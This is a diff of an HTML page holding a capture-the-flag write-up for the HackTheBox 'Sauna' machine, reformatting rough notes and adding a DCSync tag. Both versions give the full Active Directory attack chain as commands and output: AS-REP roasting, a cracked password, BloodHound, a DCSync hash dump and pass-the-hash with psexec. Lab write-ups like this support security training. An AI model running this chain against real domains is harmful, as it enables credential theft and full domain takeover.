@@ -36,44 +36,54 @@
       <h1 class="post-title">HTB - Sauna</h1>
       
       <div class="card-tags">
-        <span class="tag">Active Directory</span><span class="tag">AS-REP Roasting</span><span class="tag">Username Anarchy</span>
+        <span class="tag">Active Directory</span><span class="tag">AS-REP Roasting</span><span class="tag">Username Anarchy</span><span class="tag">DCSync</span>
       </div>
       
     </header>
     <div class="post-content">
-      <p>IP: 10.129.95.180</p>
-<h1 id="recon">Recon</h1>
-<h2 id="port-scanning">Port Scanning</h2>
-<p>![[1.png]]</p>
-<p>![[2.png]]</p>
-<p>Enumerating LDAP with windapsearch, we observe that anonymous binds are allowed.</p>
-<p>![[3.png]]</p>
-<p>FootHold
-We can use a tool such as Username Anarchy(<a href="https://github.com/urbanadventurer/username-anarchy">https://github.com/urbanadventurer/username-anarchy</a>) to create common username permutations based
-on the full names. After saving the full names to a text file, we run the script.
-==./username-anarchy &ndash;input-file /home/kali/Desktop/HTB/sauna/fullname.txt first,flast,first.last,firstl &gt; /home/kali/Desktop/HTB/sauna/username.txt==</p>
-<p>while read p; do impacket-GetNPUsers egotistical-bank.local/&quot;$p&quot; -request -no-pass -dc-ip 10.129.95.180 &raquo; hash.txt; done &lt; username.txt</p>
-<p>![[4.png]][*] Getting TGT for fsmith
-$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:bc6d98759d60bca8e93d5ca384da8e02$469ac06c2194776a82a0cca026071464643dc049ea7a1e03124b99cc12abf5f47d2da13966a55c009cd3192be4d5b6f524f610cd1784b174fc404d8e95ec7c4f5e44fcd1ce1b7e7287e17278e831c29a2d2743e0cfe4e859014f8b9649a5eebe8f5d8f484cb3469770ed42ab4bf2529eba3ad5b180f7bcfae828f44ea1a3c7e3e7eef2ed60cb2ab53368c216ffa111131f0699dc0a515baf316111ff9daaf5c858f4a35b5346063883ce4685644d87af54513f9a7aadcc3d1e896fc9528732da64ffb5d13ad14b7c36de7c7df88bdba830556fee1845086aa1545921d4a228b98deb67c8a1b285dd07688cb110f682ce02624e60c0cbe88719a37b62c80a5281</p>
-<p>hashcat &ndash;help | grep Kerberos</p>
-<p>Got Credentials:
-==username: fsmith==
-==password  : Thestrokes23==</p>
-<p>![[5.png]]</p>
-<p>With the gained, we can try to login using WinRM (port 5985).</p>
-<h1 id="privesc">Privesc</h1>
-<p>winpeas
-![[6.png]]evil-winrm -i 10.10.10.175 -u svc_loanmgr -p &lsquo;Moneymakestheworldgoround!&rsquo;</p>
-<p>using bloodhound</p>
-<p>sudo pip install bloodhound-python
-bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICAL-BANK.LOCAL -ns 10.129.95.180 -c All
-![[7.png]]
-![[8.png]]
-<a href="mailto:SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL">SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL</a> is connected with the EGOTISTICAL-BANK.LOCAL node, via the GetChangesAll edge.</p>
-<p>impacket-secretsdump <a href="mailto:egotistical-bank/svc_loanmgr@10.129.95.180">egotistical-bank/svc_loanmgr@10.129.95.180</a> -just-dc-user Administrator
-![[8.png]]</p>
-<p>impacket-psexec <a href="mailto:egotistical-bank.local/administrator@10.129.95.180">egotistical-bank.local/administrator@10.129.95.180</a> -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e</p>
+      <p><strong>Target IP:</strong> <code>10.129.95.180</code></p>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scanning">Port Scanning</h3>
+<p><img src="1.png" alt="Nmap scan results">
+<img src="2.png" alt="Service enumeration"></p>
+<p>LDAP enumeration with windapsearch confirms that anonymous binds are allowed.</p>
+<p><img src="3.png" alt="Windapsearch LDAP enumeration"></p>
+<h2 id="foothold">Foothold</h2>
+<p><a href="https://github.com/urbanadventurer/username-anarchy">Username Anarchy</a> is used to generate common username permutations from the full names gathered during LDAP enumeration. After saving the full names to a text file, the script is run:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./username-anarchy --input-file /home/kali/Desktop/HTB/sauna/fullname.txt first,flast,first.last,firstl &gt; /home/kali/Desktop/HTB/sauna/username.txt
+</span></span></code></pre></div><p>Each generated username is then tested for AS-REP Roasting:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">while</span> read p; <span style="color:#66d9ef">do</span> impacket-GetNPUsers egotistical-bank.local/<span style="color:#e6db74">&#34;</span>$p<span style="color:#e6db74">&#34;</span> -request -no-pass -dc-ip 10.129.95.180 &gt;&gt; hash.txt; <span style="color:#66d9ef">done</span> &lt; username.txt
+</span></span></code></pre></div><p>One account, <code>fsmith</code>, has Kerberos pre-authentication disabled and returns a crackable hash:</p>
+<p><img src="4.png" alt="AS-REP hash retrieved for fsmith"></p>
+<pre tabindex="0"><code>krb5asrep$23
+fsmith@EGOTISTICAL-BANK.LOCAL:bc6d98759d60bca8e93d5ca384da8e02$469ac06c2194776a82a0cca026071464643dc049ea7a1e03124b99cc12abf5f47d2da13966a55c009cd3192be4d5b6f524f610cd1784b174fc404d8e95ec7c4f5e44fcd1ce1b7e7287e17278e831c29a2d2743e0cfe4e859014f8b9649a5eebe8f5d8f484cb3469770ed42ab4bf2529eba3ad5b180f7bcfae828f44ea1a3c7e3e7eef2ed60cb2ab53368c216ffa111131f0699dc0a515baf316111ff9daaf5c858f4a35b5346063883ce4685644d87af54513f9a7aadcc3d1e896fc9528732da64ffb5d13ad14b7c36de7c7df88bdba830556fee1845086aa1545921d4a228b98deb67c8a1b285dd07688cb110f682ce02624e60c0cbe88719a37b62c80a5281
+</code></pre><p>The hash is cracked with hashcat:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat --help | grep Kerberos
+</span></span></code></pre></div><p><strong>Credentials obtained:</strong></p>
+<ul>
+<li><strong>User:</strong> <code>fsmith</code></li>
+<li><strong>Password:</strong> <code>Thestrokes23</code></li>
+</ul>
+<p><img src="5.png" alt="Cracked credentials"></p>
+<p>These credentials allow authentication over WinRM (port 5985).</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Running WinPEAS on the target uncovers another set of stored credentials.</p>
+<p><img src="6.png" alt="WinPEAS output"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -i 10.10.10.175 -u svc_loanmgr -p <span style="color:#e6db74">&#39;Moneymakestheworldgoround!&#39;</span>
+</span></span></code></pre></div><p>BloodHound is used to map out AD permissions for this new account:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo pip install bloodhound-python
+</span></span><span style="display:flex;"><span>bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICAL-BANK.LOCAL -ns 10.129.95.180 -c All
+</span></span></code></pre></div><p><img src="7.png" alt="BloodHound data collection">
+<img src="8.png" alt="BloodHound graph analysis"></p>
+<p>The graph reveals that <code>SVC_LOANMGR</code> holds a <code>GetChangesAll</code> edge on the domain object — equivalent to DCSync rights. This is abused to dump the Administrator&rsquo;s password hash directly:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-secretsdump egotistical-bank/svc_loanmgr@10.129.95.180 -just-dc-user Administrator
+</span></span></code></pre></div><p><strong>Result:</strong></p>
+<pre tabindex="0"><code></code></pre><p>Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::</p>
+<pre tabindex="0"><code>This hash is used directly for a Pass-the-Hash attack to gain full administrative access:
 
+```bash
+impacket-psexec egotistical-bank.local/administrator@10.129.95.180 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
+</code></pre>
     </div>
     <footer class="post-footer">
       <a href="/writeup/" class="btn btn-outline">← Back to Writeups</a>
